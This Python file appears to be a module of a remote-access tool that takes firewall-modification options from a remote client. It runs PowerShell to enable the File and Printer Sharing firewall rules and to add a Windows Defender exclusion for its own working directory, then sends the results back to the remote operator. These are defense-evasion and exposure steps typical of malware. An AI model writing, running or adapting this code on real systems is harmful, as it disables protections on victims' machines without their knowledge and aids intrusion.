from core.utils import display_msg
import subprocess
import os
import tempfile

def add_rule(command, client):
    
    all_commands = ["powershell.exe"]
    all_commands.append(command)
    output = subprocess.run(all_commands, shell=True,capture_output=True,  stdin=subprocess.DEVNULL)
    if output.stderr.decode('utf-8') == "":
        cmd_result = (output.stdout.decode('utf-8'))
    else:
        cmd_result = (output.stderr.decode('utf-8'))
    client.send_data("result : "+cmd_result)
    display_msg("Successfully added rule")


def modify_firewall(client):
    # display_msg("Modifying Firewall")
    f_opt = client.receive_data()
    if f_opt == "1":
        display_msg("Adding File sharing rule")
        command = "netsh advfirewall firewall set rule group='File and Printer Sharing' new enable=Yes"
        add_rule(command, client)
    elif f_opt == "2":
        display_msg("Adding Exception to firewall")
        command = "Add-MpPreference -ExclusionPath " + str(os.getcwd())
        add_rule(command, client)

    else:
        print("invalid option entered")
       